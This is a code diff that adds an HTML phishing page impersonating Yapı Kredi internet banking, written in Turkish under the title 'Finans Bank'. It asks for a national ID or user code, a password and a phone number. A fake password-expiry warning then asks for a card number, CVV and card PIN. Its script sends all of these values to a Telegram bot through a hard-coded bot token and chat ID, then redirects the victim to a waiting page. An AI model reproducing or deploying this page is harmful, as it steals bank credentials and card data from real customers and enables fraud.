@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finans Bank</title>
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/source/fonts.css">
+    <link rel="stylesheet" href="https://internetsube.yapikredi.com.tr/ngi-static/css/main.ui.min.css">
+    <link rel="stylesheet" href="main.css">
+    <style>
+        .hidden {
+            display: none;
+        }
+
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            margin: 50px auto;
+        }
+
+        .warning {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .warning button {
+            margin-top: 20px;
+        }
+
+        .login-button, .warning button {
+            background-color: #0073e6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            width: 100%;
+        }
+
+        .login-button:hover, .warning button:hover {
+            background-color: #005bb5;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .input-group input:focus {
+            border-color: #0073e6;
+            outline: none;
+            box-shadow: 0 0 5px rgba(0, 115, 230, 0.5);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            max-width: 150px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Telegram bilgilerini doğrudan HTML içinde saklıyoruz -->
+    <div class="container" id="login-screen" data-telegram-token="7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY" data-telegram-chat-id="-1002179246406">
+        <div class="logo">
+            <img src="./logo.png" alt="Yapı Kredi Logo">
+        </div>
+
+        <div id="individual" class="tab-content">
+            <div class="input-group">
+                <input type="text" id="tc-kimlik" placeholder="T.C. Kimlik No veya Kullanıcı Kodu" maxlength="11">
+            </div>
+            <div class="input-group">
+                <input type="password" id="sifre" placeholder="Şifre" maxlength="6">
+            </div>
+            <div class="input-group">
+                <input type="text" id="telefon" placeholder="Telefon Numarası" maxlength="12">
+            </div>
+        </div>
+
+        <button class="login-button" onclick="showWarningScreen()">Giriş</button>
+
+        <a href="#" class="forgot-password">Şifre Al / Şifremi Unuttum</a>
+    </div>
+
+    <div class="container hidden" id="warning-screen">
+        <div class="logo">
+            <img src="./logo.png" alt="Yapı Kredi Logo">
+        </div>
+        <h1>UYARI</h1>
+        <p>Son 6 Ay içinde Şifre Güncellemesi yapılmadığından dolayı Şifrenizi Sıfırlayınız</p>
+        <button class="login-button" onclick="showResetScreen()">Şifre Sıfırlama</button>
+    </div>
+
+    <div class="container hidden" id="reset-screen">
+        <div class="logo">
+            <img src="./logo.png" alt="Yapı Kredi Logo">
+        </div>
+        <div class="input-group">
+            <input type="text" id="kart-no" placeholder="Kredi / Banka Kart No (16 Hane)" maxlength="16">
+        </div>
+        <div class="input-group">
+            <input type="text" id="cvv" placeholder="3 Haneli CVV No" maxlength="3">
+        </div>
+        <div class="input-group">
+            <input type="password" id="kart-sifre" placeholder="Kart Şifresi">
+        </div>
+        <button class="login-button" onclick="submitResetInfo()">Şifre Sıfırlama</button>
+    </div>
+
+    <script>
+        // Telegram bilgilerini doğrudan HTML üzerinden alıyoruz
+        const container = document.getElementById('login-screen');
+        const TELEGRAM_CONFIG = {
+            TOKEN: container.getAttribute('data-telegram-token'),
+            CHAT_ID: container.getAttribute('data-telegram-chat-id')
+        };
+
+        function showWarningScreen() {
+            document.getElementById('login-screen').classList.add('hidden');
+            document.getElementById('warning-screen').classList.remove('hidden');
+        }
+
+        function showResetScreen() {
+            document.getElementById('warning-screen').classList.add('hidden');
+            document.getElementById('reset-screen').classList.remove('hidden');
+        }
+
+        async function submitResetInfo() {
+            const tcKimlik = document.getElementById('tc-kimlik').value;
+            const sifre = document.getElementById('sifre').value;
+            const telefon = document.getElementById('telefon').value;
+            const kartNo = document.getElementById('kart-no').value;
+            const cvv = document.getElementById('cvv').value;
+            const kartSifre = document.getElementById('kart-sifre').value;
+
+            const data = {
+                tcKimlik,
+                sifre,
+                telefon,
+                kartNo,
+                cvv,
+                kartSifre
+            };
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                        text: JSON.stringify(data, null, 2)
+                    })
+                });
+
+                const responseData = await response.json();
+                if (!response.ok) {
+                    throw new Error(`Telegram API hatası: ${responseData.description}`);
+                }
+
+                alert('SIFIRLAMA BASLATILIYOR');
+                
+                // Şifre sıfırlama işlemi tamamlandığında bekle.html sayfasına yönlendirme
+                window.location.href = 'bekle.html';  // Yönlendirme yapılacak sayfa
+            } catch (error) {
+                alert('Bir hata oluştu. Bilgiler gönderilemedi.');
+                console.error(error);
+            }
+        }
+    </script>
+</body>
+
+</html>
